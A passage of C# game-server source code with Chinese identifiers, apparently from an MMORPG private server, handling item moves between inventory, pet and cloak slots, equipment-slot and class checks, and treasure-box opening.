					byte[] 物品_byte2 = 装备栏包裹[num4].物品_byte;
					装备栏包裹[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
					人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte2;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				更新灵兽负重();
				更新金钱和负重();
				更新灵兽初始话装备篮包裹();
				break;
			}
		}

		public void 操作宠物已装备物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			ItmeClass value = null;
			if (BitConverter.ToInt32(人物灵兽.宠物以装备[num2].物品ID, 0) == 0 || !World.Itme.TryGetValue(BitConverter.ToInt32(人物灵兽.宠物以装备[num2].物品ID, 0), out var value2))
			{
				return;
			}
			switch (num3)
			{
			case 60:
				if (num4 >= 16)
				{
					break;
				}
				if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0) == 0)
				{
					if (BitConverter.ToInt32(人物灵兽.宠物以装备[num2].物品ID, 0) != 0)
					{
						人物灵兽.宠物装备栏[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
						人物灵兽.宠物以装备[num2].物品_byte = 物品_byte;
						更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
					}
				}
				else if (!人物灵兽.宠物装备栏[num4].锁定)
				{
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0), out value))
					{
						break;
					}
					if (宠物物品职业是否相符(人物灵兽.FLD_JOB, value.FLD_RESIDE1, value.FLD_RESIDE2) && 装备位置是否正确(value.FLD_RESIDE2, num2))
					{
						byte[] 物品_byte3 = 人物灵兽.宠物装备栏[num4].物品_byte;
						人物灵兽.宠物装备栏[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
						人物灵兽.宠物以装备[num2].物品_byte = 物品_byte3;
						更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
					}
				}
				召唤更新显示已装备物品(this);
				人物灵兽.计算灵兽装备数据();
				更新灵兽HP_MP_SP();
				更新灵兽经验和历练();
				更新灵兽武功和状态();
				更新灵兽负重();
				更新灵兽初始话装备篮包裹();
				更新人物数据(this);
				更新广播人物数据();
				计算人物装备数据();
				break;
			case 59:
				if (BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品ID, 0) == 0)
				{
					if (宠物物品职业是否相符(人物灵兽.FLD_JOB, value2.FLD_RESIDE1, value2.FLD_RESIDE2) && 装备位置是否正确(value2.FLD_RESIDE2, num4))
					{
						人物灵兽.宠物以装备[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
						人物灵兽.宠物以装备[num2].物品_byte = 物品_byte;
						更换装备位置(num, num2, num3, num4, 人物灵兽.宠物以装备[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品数量, 0));
					}
				}
				else if (World.Itme.TryGetValue(BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品ID, 0), out value) && 宠物物品职业是否相符(人物灵兽.FLD_JOB, value2.FLD_RESIDE1, value2.FLD_RESIDE2) && 装备位置是否正确(value2.FLD_RESIDE2, num4))
				{
					byte[] 物品_byte4 = 人物灵兽.宠物以装备[num4].物品_byte;
					人物灵兽.宠物以装备[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
					人物灵兽.宠物以装备[num2].物品_byte = 物品_byte4;
					更换装备位置(num, num2, num3, num4, 人物灵兽.宠物以装备[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品数量, 0));
				}
				break;
			case 1:
				if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
				{
					装备栏包裹[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
					人物灵兽.宠物以装备[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				else
				{
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0), out value))
					{
						break;
					}
					if (宠物物品职业是否相符(人物灵兽.FLD_JOB, value.FLD_RESIDE1, value.FLD_RESIDE2) && 装备位置是否正确(value.FLD_RESIDE2, num2))
					{
						byte[] 物品_byte2 = 装备栏包裹[num4].物品_byte;
						装备栏包裹[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
						人物灵兽.宠物以装备[num2].物品_byte = 物品_byte2;
						更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
					}
				}
				召唤更新显示已装备物品(this);
				人物灵兽.计算灵兽装备数据();
				更新灵兽HP_MP_SP();
				更新灵兽经验和历练();
				更新灵兽武功和状态();
				更新灵兽负重();
				更新金钱和负重();
				更新灵兽初始话装备篮包裹();
				更新人物数据(this);
				更新广播人物数据();
				计算人物装备数据();
				break;
			}
		}

		public void 操作披风行囊物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			if (披风行囊[num2].锁定 || BitConverter.ToInt32(披风行囊[num2].物品ID, 0) == 0)
			{
				return;
			}
			switch (num3)
			{
			case 169:
				if (!披风行囊[num2].锁定)
				{
					if (BitConverter.ToInt32(披风行囊[num4].物品ID, 0) == 0)
					{
						披风行囊[num4].物品_byte = 披风行囊[num2].物品_byte;
						披风行囊[num2].物品_byte = 物品_byte;
						更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
					}
					else
					{
						byte[] 物品_byte3 = 披风行囊[num4].物品_byte;
						披风行囊[num4].物品_byte = 披风行囊[num2].物品_byte;
						披风行囊[num2].物品_byte = 物品_byte3;
						更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
					}
				}
				break;
			case 1:
				if (base.Player_Money < 1000000)
				{
					系统提示("你真穷，100万都没有。");
					break;
				}
				base.Player_Money -= 1000000L;
				if (BitConverter.ToInt32(披风行囊[num2].物品ID, 0) != 0 && !披风行囊[num2].锁定 && BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
				{
					装备栏包裹[num4].物品_byte = 披风行囊[num2].物品_byte;
					披风行囊[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				break;
			case 0:
			{
				if (BitConverter.ToInt32(披风行囊[num2].物品ID, 0) == 0 || 披风行囊[num2].锁定 || !World.Itme.TryGetValue(BitConverter.ToInt32(披风行囊[num2].物品ID, 0), out var value) || (value.FLD_SEX != 0 && value.FLD_SEX != base.Player_Sex) || value.FLD_RESIDE2 != 12)
				{
					break;
				}
				ItmeClass value2;
				if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
				{
					if (base.Player_Money < 1000000)
					{
						系统提示("你真穷，100万都没有。");
						break;
					}
					base.Player_Money -= 1000000L;
					装备栏已穿装备[num4].物品_byte = 披风行囊[num2].物品_byte;
					披风行囊[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
				}
				else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0), out value2))
				{
					if (value.FLD_RESIDE2 != value2.FLD_RESIDE2)
					{
						break;
					}
					byte[] 物品_byte2 = 装备栏已穿装备[num4].物品_byte;
					装备栏已穿装备[num4].物品_byte = 披风行囊[num2].物品_byte;
					披风行囊[num2].物品_byte = 物品_byte2;
					更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
				}
				更新人物数据(this);
				更新广播人物数据();
				更新装备效果();
				计算人物装备数据();
				更新武功和状态();
				更新金钱和负重();
				更新HP_MP_SP();
				break;
			}
			}
		}

		public void 操作辅助装备栏物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			物品类 物品类2 = 辅助装备栏装备[num2];
			if (BitConverter.ToInt32(物品类2.物品ID, 0) == 0 || 物品类2.锁定)
			{
				return;
			}
			switch (num3)
			{
			case 123:
			{
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(辅助装备栏装备[num2].物品ID, 0), out var value3))
				{
					break;
				}
				ItmeClass value4;
				if (BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0) == 0)
				{
					if (装备位置是否正确(value3.FLD_RESIDE2, num4))
					{
						辅助装备栏装备[num4].物品_byte = 辅助装备栏装备[num2].物品_byte;
						辅助装备栏装备[num2].物品_byte = 物品_byte;
						更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
					}
				}
				else if (World.Itme.TryGetValue(BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0), out value4) && value3.FLD_RESIDE2 == value4.FLD_RESIDE2)
				{
					byte[] 物品_byte3 = 辅助装备栏装备[num4].物品_byte;
					辅助装备栏装备[num4].物品_byte = 辅助装备栏装备[num2].物品_byte;
					辅助装备栏装备[num2].物品_byte = 物品_byte3;
					更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
				}
				break;
			}
			case 1:
			{
				if (num4 >= 96 || (num2 == 14 && 人物灵兽 != null) || BitConverter.ToInt32(辅助装备栏装备[num2].物品ID, 0) == 0)
				{
					break;
				}
				ItmeClass value;
				if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
				{
					装备栏包裹[num4].物品_byte = 辅助装备栏装备[num2].物品_byte;
					辅助装备栏装备[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				else if (World.Itme.TryGetValue(BitConverter.ToInt32(辅助装备栏装备[num2].物品ID, 0), out value))
				{
					if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0 || 装备栏包裹[num4].锁定)
					{
						break;
					}
					if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0), out var value2))
					{
						if (value.FLD_RESIDE2 != value2.FLD_RESIDE2 || value2.FLD_LEVEL > base.Player_Level || (value2.FLD_ZX != 0 && value2.FLD_ZX != base.Player_Zx))
						{
							break;
						}
						if (!物品职业是否相符(base.Player_Job, value2.FLD_RESIDE1, value2.FLD_RESIDE2, value2.FLD_PID))
						{
							系统提示("所使用的装备与职业不符");
							break;
						}
						if ((value2.FLD_JOB_LEVEL != 0 && value2.FLD_JOB_LEVEL > base.Player_Job_leve) || (value2.FLD_SEX != 0 && value2.FLD_SEX != base.Player_Sex) || (value2.FLD_XWJD >= 1 && value2.FLD_XWJD > base.武勋阶段))
						{
							break;
						}
						byte[] 物品_byte2 = 装备栏包裹[num4].物品_byte;
						装备栏包裹[num4].物品_byte = 辅助装备栏装备[num2].物品_byte;
						辅助装备栏装备[num2].物品_byte = 物品_byte2;
						更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
					}
				}
				更新人物数据(this);
				更新广播人物数据();
				更新装备效果();
				计算人物装备数据();
				更新武功和状态();
				更新金钱和负重();
				更新HP_MP_SP();
				break;
			}
			}
		}

		public void 操作宝珠装备栏物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			物品类 物品类2 = 宝珠装备栏装备[num2];
			if (BitConverter.ToInt32(物品类2.物品ID, 0) == 0 || 物品类2.锁定)
			{
				return;
			}
			switch (num3)
			{
			case 188:
			{
				if (World.Itme.TryGetValue(BitConverter.ToInt32(宝珠装备栏装备[num2].物品ID, 0), out var value3))
				{
					ItmeClass value4;
					if (BitConverter.ToInt32(宝珠装备栏装备[num4].物品ID, 0) == 0)
					{
						if (装备位置是否正确(value3.FLD_RESIDE2, num4))
						{
							宝珠装备栏装备[num4].物品_byte = 宝珠装备栏装备[num2].物品_byte;
							宝珠装备栏装备[num2].物品_byte = 物品_byte;
							更换装备位置(num, num2, num3, num4, 宝珠装备栏装备[num4].物品_byte, BitConverter.ToInt32(宝珠装备栏装备[num4].物品数量, 0));
						}
					}
					else if (World.Itme.TryGetValue(BitConverter.ToInt32(宝珠装备栏装备[num4].物品ID, 0), out value4) && value3.FLD_RESIDE2 == value4.FLD_RESIDE2)
					{
						byte[] 物品_byte3 = 宝珠装备栏装备[num4].物品_byte;
						宝珠装备栏装备[num4].物品_byte = 宝珠装备栏装备[num2].物品_byte;
						宝珠装备栏装备[num2].物品_byte = 物品_byte3;
						更换装备位置(num, num2, num3, num4, 宝珠装备栏装备[num4].物品_byte, BitConverter.ToInt32(宝珠装备栏装备[num4].物品数量, 0));
					}
				}
				更新人物数据(this);
				更新广播人物数据();
				更新装备效果();
				计算人物装备数据();
				更新武功和状态();
				更新金钱和负重();
				更新HP_MP_SP();
				break;
			}
			case 1:
			{
				if (num4 >= 96 || (num2 == 14 && 人物灵兽 != null) || BitConverter.ToInt32(宝珠装备栏装备[num2].物品ID, 0) == 0)
				{
					break;
				}
				ItmeClass value;
				if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
				{
					装备栏包裹[num4].物品_byte = 宝珠装备栏装备[num2].物品_byte;
					宝珠装备栏装备[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				else if (World.Itme.TryGetValue(BitConverter.ToInt32(宝珠装备栏装备[num2].物品ID, 0), out value))
				{
					if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0 || 装备栏包裹[num4].锁定)
					{
						break;
					}
					if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0), out var value2))
					{
						if (value.FLD_RESIDE2 != value2.FLD_RESIDE2 || value2.FLD_LEVEL > base.Player_Level || (value2.FLD_ZX != 0 && value2.FLD_ZX != base.Player_Zx))
						{
							break;
						}
						if (!物品职业是否相符(base.Player_Job, value2.FLD_RESIDE1, value2.FLD_RESIDE2, value2.FLD_PID))
						{
							系统提示("所使用的装备与职业不符");
							break;
						}
						if ((value2.FLD_JOB_LEVEL != 0 && value2.FLD_JOB_LEVEL > base.Player_Job_leve) || (value2.FLD_SEX != 0 && value2.FLD_SEX != base.Player_Sex) || (value2.FLD_XWJD >= 1 && value2.FLD_XWJD > base.武勋阶段))
						{
							break;
						}
						byte[] 物品_byte2 = 装备栏包裹[num4].物品_byte;
						装备栏包裹[num4].物品_byte = 宝珠装备栏装备[num2].物品_byte;
						宝珠装备栏装备[num2].物品_byte = 物品_byte2;
						更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
					}
				}
				更新人物数据(this);
				更新广播人物数据();
				更新装备效果();
				计算人物装备数据();
				更新武功和状态();
				更新金钱和负重();
				更新HP_MP_SP();
				break;
			}
			}
		}

		public void 操作凝神珠包裹(int num, int num2, int num3, int num4, int num5)
		{
			switch (num)
			{
			case 171:
			{
				if (凝神珠包裹[num2].物品绑定 || BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) != 0)
				{
					break;
				}
				byte[] 物品_byte2 = new byte[World.数据库单个物品大小];
				装备栏包裹[num4].物品_byte = 凝神珠包裹[num2].物品_byte;
				凝神珠包裹[num2].物品_byte = 物品_byte2;
				更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				凝神珠操作包(2, num4, BitConverter.ToInt32(凝神珠包裹[num2].物品ID, 0), 凝神珠包裹[num2].FLD_MAGIC1, 凝神珠包裹[num2].FLD_MAGIC0);
				int num7 = 0;
				for (int j = 0; j < 6; j++)
				{
					if (BitConverter.ToInt32(凝神珠包裹[j].物品数量, 0) != 0)
					{
						if (num7 == 3)
						{
							break;
						}
						num7++;
						凝神珠操作包(1, j, BitConverter.ToInt32(凝神珠包裹[j].物品ID, 0), 凝神珠包裹[j].FLD_MAGIC1, 凝神珠包裹[j].FLD_MAGIC0);
					}
				}
				更新金钱和负重();
				break;
			}
			case 1:
			{
				if (凝神珠包裹[num2].物品绑定 || BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) != 0)
				{
					break;
				}
				byte[] 物品_byte = new byte[World.数据库单个物品大小];
				装备栏包裹[num4].物品_byte = 凝神珠包裹[num2].物品_byte;
				凝神珠包裹[num2].物品_byte = 物品_byte;
				更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				凝神珠操作包(2, num4, BitConverter.ToInt32(凝神珠包裹[num2].物品ID, 0), 凝神珠包裹[num2].FLD_MAGIC1, 凝神珠包裹[num2].FLD_MAGIC0);
				int num6 = 0;
				for (int i = 0; i < 6; i++)
				{
					if (BitConverter.ToInt32(凝神珠包裹[i].物品数量, 0) != 0)
					{
						if (num6 == 3)
						{
							break;
						}
						num6++;
						凝神珠操作包(1, i, BitConverter.ToInt32(凝神珠包裹[i].物品ID, 0), 凝神珠包裹[i].FLD_MAGIC1, 凝神珠包裹[i].FLD_MAGIC0);
					}
				}
				更新金钱和负重();
				break;
			}
			}
		}

		public static bool 装备位置是否正确(int FLD_RESIDE2, int 目标位置)
		{
			switch (FLD_RESIDE2)
			{
			case 1:
				if (目标位置 == 0)
				{
					break;
				}
				return false;
			case 2:
				if (目标位置 == 1 || 目标位置 == 2)
				{
					break;
				}
				return false;
			case 4:
				if (目标位置 == 3)
				{
					break;
				}
				return false;
			case 5:
				if (目标位置 == 4)
				{
					break;
				}
				return false;
			case 6:
				if (目标位置 == 5)
				{
					break;
				}
				return false;
			case 7:
				if (目标位置 == 6)
				{
					break;
				}
				return false;
			case 8:
				if (目标位置 == 7 || 目标位置 == 8)
				{
					break;
				}
				return false;
			case 10:
				if (目标位置 == 9 || 目标位置 == 10)
				{
					break;
				}
				return false;
			case 12:
				if (目标位置 == 11)
				{
					break;
				}
				return false;
			case 13:
				if (目标位置 == 12)
				{
					break;
				}
				return false;
			case 14:
				if (目标位置 == 13)
				{
					break;
				}
				return false;
			case 15:
				if (目标位置 == 14)
				{
					break;
				}
				return false;
			case 16:
				if (目标位置 == 15)
				{
					break;
				}
				return false;
			case 26:
				if (目标位置 == 16)
				{
					break;
				}
				return false;
			case 32:
				if (目标位置 == 3)
				{
					break;
				}
				return false;
			case 33:
				if (目标位置 == 0)
				{
					break;
				}
				return false;
			case 34:
				if (目标位置 == 5)
				{
					break;
				}
				return false;
			case 35:
				if (目标位置 == 1 || 目标位置 == 2)
				{
					break;
				}
				return false;
			case 36:
				if (目标位置 == 4)
				{
					break;
				}
				return false;
			case 41:
				if (目标位置 == 3)
				{
					break;
				}
				return false;
			case 42:
				if (目标位置 == 0)
				{
					break;
				}
				return false;
			case 43:
				if (目标位置 == 1 || 目标位置 == 2)
				{
					break;
				}
				return false;
			case 45:
				if (目标位置 == 4)
				{
					break;
				}
				return false;
			default:
				return false;
			}
			return true;
		}

		public static bool 物品职业是否相符(int PlayerJob, int RESIDE1, int RESIDE2, int pid)
		{
			switch (PlayerJob)
			{
			case 1:
			case 2:
			case 3:
			case 4:
			case 5:
			case 6:
			case 7:
			case 8:
			case 9:
			case 10:
			case 12:
			case 13:
				if (PlayerJob == RESIDE1 || RESIDE1 == 0)
				{
					return true;
				}
				break;
			case 11:
				if (RESIDE1 == PlayerJob)
				{
					return true;
				}
				switch (RESIDE2)
				{
				case 7:
					if (pid == 1100005 || pid == 1100006 || pid == 1100001 || pid == 1100002 || pid == 1100003)
					{
						return true;
					}
					break;
				case 12:
				case 13:
				case 14:
				case 15:
				case 16:
				case 26:
				case 32:
				case 33:
				case 34:
				case 35:
				case 36:
					return true;
				}
				break;
			}
			return false;
		}

		public static bool 宠物物品职业是否相符(int job, int RESIDE1, int RESIDE2)
		{
			if (RESIDE1 == 20)
			{
				if (RESIDE2 == 45 && (job == 1 || job == 2))
				{
					return false;
				}
				return true;
			}
			switch (job)
			{
			case 1:
				if (RESIDE1 == 21)
				{
					return true;
				}
				break;
			case 2:
				if (RESIDE1 == 22)
				{
					return true;
				}
				break;
			case 3:
				if (RESIDE1 == 23)
				{
					return true;
				}
				break;
			case 4:
				if (RESIDE1 == 24)
				{
					return true;
				}
				break;
			case 5:
				if (RESIDE1 == 25)
				{
					return true;
				}
				break;
			case 6:
				if (RESIDE1 == 26)
				{
					return true;
				}
				break;
			}
			return false;
		}

		public void 打开物品(byte[] 封包数据, int 封包大小)
		{
			if (base.人物_HP <= 0)
			{
				return;
			}
			封包修改(封包数据, 封包大小);
			if (打开仓库中 || (个人商店 != null && 个人商店.个人商店是否开启))
			{
				return;
			}
			try
			{
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 14, array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				int num2 = 封包数据[10];
				int num3 = 封包数据[11];
				BitConverter.ToInt32(封包数据, 26);
				switch (num2)
				{
				case 0:
				{
					if (num3 == 14 && 人物灵兽 != null)
					{
						break;
					}
					for (int i = 0; i < 36; i++)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 0)
						{
							装备栏包裹[i].物品_byte = 装备栏已穿装备[num3].物品_byte;
							装备栏已穿装备[num3].物品_byte = new byte[World.数据库单个物品大小];
							更换装备位置(num2, num3, 1, i, 装备栏包裹[i].物品_byte, 1);
							更新装备效果();
							计算人物装备数据();
							更新武功和状态();
							更新金钱和负重();
							更新HP_MP_SP();
							break;
						}
					}
					break;
				}
				case 1:
				{
					if (BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) == 1600101 || BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) == 1600102)
					{
						if (变身id == 0)
						{
							变身id = 1600101;
							更新人物数据(this);
							更新广播人物数据();
						}
						else
						{
							变身id = 0;
							更新人物数据(this);
							更新广播人物数据();
						}
					}
					else if (BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) == 1600103 || BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) == 1600104)
					{
						if (变身id == 0)
						{
							变身id = 1600103;
							更新人物数据(this);
							更新广播人物数据();
						}
						else
						{
							变身id = 0;
							更新人物数据(this);
							更新广播人物数据();
						}
					}
					if (BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) == 0)
					{
						break;
					}
					if (装备栏包裹[num3].物品绑定)
					{
						num -= 20000;
					}
					if (BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) != num || 装备栏包裹[num3].锁定)
					{
						break;
					}
					ItmeClass itmeClass2 = World.Itme[BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0)];
					if ((itmeClass2.FLD_RESIDE2 >= 1 && itmeClass2.FLD_RESIDE2 <= 16) || (itmeClass2.FLD_RESIDE2 == 26 && itmeClass2.FLD_LEVEL <= base.Player_Level && (itmeClass2.FLD_ZX == 0 || itmeClass2.FLD_ZX == base.Player_Zx) && (itmeClass2.FLD_RESIDE1 == 0 || itmeClass2.FLD_RESIDE1 == base.Player_Job) && (itmeClass2.FLD_JOB_LEVEL == 0 || itmeClass2.FLD_JOB_LEVEL <= base.Player_Job_leve) && (itmeClass2.FLD_SEX == 0 || itmeClass2.FLD_SEX == base.Player_Sex) && itmeClass2.FLD_XWJD < 1))
					{
						ItmeClass itmeClass3 = World.Itme[BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0)];
						int num5 = itmeClass3.FLD_RESIDE2 - 1;
						if (itmeClass3.FLD_RESIDE2 == 26)
						{
							num5 = 16;
						}
						if (BitConverter.ToInt32(装备栏已穿装备[num5].物品ID, 0) == 0)
						{
							装备栏已穿装备[num5].物品_byte = 装备栏包裹[num3].物品_byte;
							装备栏包裹[num3].物品_byte = new byte[World.数据库单个物品大小];
							更换装备位置(num2, num3, 0, num5, 装备栏已穿装备[num5].物品_byte, 1);
							计算人物装备数据();
							更新装备效果();
							更新武功和状态();
							更新金钱和负重();
							更新HP_MP_SP();
						}
					}
					if (itmeClass2.FLD_RESIDE2 == 17)
					{
						开箱(封包数据);
					}
					else if (itmeClass2.FLD_RESIDE2 == 19)
					{
						气功书(封包数据);
					}
					else if (itmeClass2.FLD_RESIDE2 == 20)
					{
						打开物品触发器(封包数据);
					}
					else if (itmeClass2.FLD_RESIDE2 == 1792)
					{
						武功书(封包数据);
					}
					else
					{
						吃药(封包数据);
					}
					break;
				}
				case 60:
				{
					if (num3 == 14 && 人物灵兽 != null)
					{
						break;
					}
					int num4 = 0;
					bool flag = false;
					ItmeClass itmeClass = World.Itme[BitConverter.ToInt32(人物灵兽.宠物装备栏[num3].物品ID, 0)];
					switch (itmeClass.FLD_RESIDE2)
					{
					case 5:
						num4 = 4;
						break;
					case 23:
						num4 = 0;
						break;
					case 24:
						num4 = 3;
						break;
					case 25:
						num4 = ((人物灵兽.宠物以装备[1].Get物品ID == 0L) ? 1 : 2);
						break;
					}
					switch (itmeClass.FLD_RESIDE1)
					{
					case 6:
						flag = true;
						break;
					case 7:
						if (人物灵兽.FLD_JOB == 1)
						{
							flag = true;
						}
						break;
					case 8:
						if (人物灵兽.FLD_JOB == 2)
						{
							flag = true;
						}
						break;
					case 9:
						if (人物灵兽.FLD_JOB == 3)
						{
							flag = true;
						}
						break;
					case 10:
						if (人物灵兽.FLD_JOB == 4)
						{
							flag = true;
						}
						break;
					case 15:
						if (人物灵兽.FLD_JOB == 5)
						{
							flag = true;
						}
						break;
					case 20:
						if (人物灵兽.FLD_JOB == 6)
						{
							flag = true;
						}
						break;
					}
					if (BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品ID, 0) == 0 && flag)
					{
						人物灵兽.宠物以装备[num4].物品_byte = 人物灵兽.宠物装备栏[num3].物品_byte;
						人物灵兽.宠物装备栏[num3].物品_byte = new byte[World.数据库单个物品大小];
						更换装备位置(num2, num3, num2 - 1, num4, 人物灵兽.宠物以装备[num4].物品_byte, 1);
						召唤更新显示已装备物品(this);
						更新灵兽负重();
						更新灵兽经验和历练();
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新人物数据(this);
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				if (World.是否开启票红字2 == 1)
				{
					MainForm.WriteLine(1, "打开物品出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
				}
			}
		}

		public void 开箱(byte[] data)
		{
			try
			{
				int num = 得到包裹空位(this);
				int num2 = data[11];
				byte[] array = new byte[4];
				Buffer.BlockCopy(data, 14, array, 0, 4);
				if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != BitConverter.ToInt32(array, 0) || num == -1)
				{
					return;
				}
				OpenClass open = OpenClass.GetOpen(BitConverter.ToInt32(array, 0), base.Player_Job, base.Player_Zx);
				if (open != null)
				{
					if (!World.Itme.TryGetValue(open.FLD_PIDX, out var value))
					{
						return;
					}
					int fLD_MAGIC = open.FLD_MAGIC1;
					if (value.FLD_RESIDE2 == 16 && fLD_MAGIC == 0)
					{
						switch (value.FLD_PID)
						{
						case 800000001:
						case 800000002:
						case 800000011:
						case 800000012:
						case 800000013:
						case 800000023:
						case 800000024:
						case 800000028:
						case 800000030:
						case 800000031:
						case 800000032:
						case 800000033:
						case 800000061:
						case 800000062:
						case 800000071:
						case 800000076:
							fLD_MAGIC = World.GetValue(value.FLD_PID, 6);
							break;
						}
					}
					减去物品(num2, 1);
					switch (open.FLD_PIDX)
					{
					case 909000001:
						base.人物经验 += open.FLD_NUMBER;
						计算人物基本数据3();
						更新经验和历练();
						return;
					case 909000002:
						base.Player_ExpErience += open.FLD_NUMBER;
						更新经验和历练();
						return;
					case 909000004:
						base.Player_Money += (uint)open.FLD_NUMBER;
						得到钱的提示((uint)open.FLD_NUMBER);
						更新金钱和负重();
						return;
					case 909000005:
						base.Player_WuXun += open.FLD_NUMBER;
						系统提示("获得" + open.FLD_NAMEX + open.FLD_NUMBER);
						更新武功和状态();
						return;
					}
					AddItemWithProperties(open.FLD_PIDX, num, open.FLD_NUMBER, open.FLD_MAGIC1, open.FLD_MAGIC2, open.FLD_MAGIC3, open.FLD_MAGIC4, open.FLD_MAGIC5, open.FLD_觉醒, open.FLD_中级附魂, open.FLD_进化, open.FLD_BD, open.FLD_DAYS);
					if (open.是否开启公告 == 1)
					{
						if (World.是否开启公告掉落提示 == 1)
						{
							玩家从宝盒里获得物品(base.UserName, open.FLD_PID, open.FLD_PIDX);
						}
						else
						{
							string text = "恭喜" + base.UserName + "获得了[" + open.FLD_NAME + "]内的[" + open.FLD_NAMEX + "]。";
							World.conn.发送("开启宝盒|" + 10 + "|" + text + "|" + World.ServerID);
						}
					}
